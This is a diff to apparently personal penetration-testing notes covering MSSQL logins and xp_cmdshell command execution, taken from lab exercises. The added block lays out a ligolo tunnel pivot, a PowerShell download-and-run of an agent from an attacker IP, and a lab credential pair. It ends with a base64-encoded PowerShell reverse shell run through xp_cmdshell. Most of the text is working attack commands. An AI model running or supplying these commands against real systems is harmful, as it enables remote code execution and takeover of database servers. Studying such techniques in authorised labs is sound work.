@@ -421,8 +421,21 @@ rpcclient -U "" -N <IP>
 
 ```
 
-#### xp_cmdshell -> RCE
+### <ins>1433 - MSSQL</ins>
 
+```
+
+1. Login: sqsh -S <IP> -U <username> -P "<pass>"
+
+2. Login: sqsh -S <IP> -U .\\<Username> -P <pass> -D <database>
+
+3. Login: impacket-mssqlclient :<username>:<pass>@<IP> -windows-auth
+
+4. Login: impacket-mssqlclient :<username>:<pass>@<IP> -local-auth
+
+```
+#### xp_cmdshell -> RCE
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
 ```
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 
@@ -476,20 +489,7 @@ admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 
 ```
 
-### <ins>1433 - MSSQL</ins>
-
-```
-
-1. Login: sqsh -S <IP> -U <username> -P "<pass>"
-
-2. Login: sqsh -S <IP> -U .\\<Username> -P <pass> -D <database>
-
-3. Login: impacket-mssqlclient :<username>:<pass>@<IP> -windows-auth
-
-4. Login: impacket-mssqlclient :<username>:<pass>@<IP> -local-auth
-
-```
-
+### Example xp_cmdshell
 ```
 This is mostly just notes from a htb I thought was worth remembering:
 
@@ -505,7 +505,7 @@ select name from master..sysdatabases;
 
 ```
 #### xp_cmdshell -> RCE
-
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
 ```
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 
@@ -527,6 +527,41 @@ RECONFIGURE
 sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
+
+```
+
+### Another Good xp_cmdshell example
+```
+From a multi-step AD set, worth remembering.
+
+On Kali:
+./proxy -selfcert
+session
+ip route add 10.10.199.0/24 dev ligolo
+tunnel_start
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
+
+
+rlwrap -cAr nc -lvnp 4321
+
+Into MS01:
+ssh Administrator@$ip
+iwr -uri http://192.168.45.196/agent.exe -Outfile agent.exe
+.\agent.exe -connect 192.168.45.196:11601 -ignore-cert
+
+MS02:
+impacket-mssqlclient 'sql_svc':'Dolphin1'@10.10.199.148 -windows-auth -p 1433
+
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+EXEC master..xp_cmdshell 'whoami'
+EXEC master..xp_cmdshell 'ping '
+
+EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA5ADkALgAxADQANwAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
+
+Im in, finally...
 
 ```
 
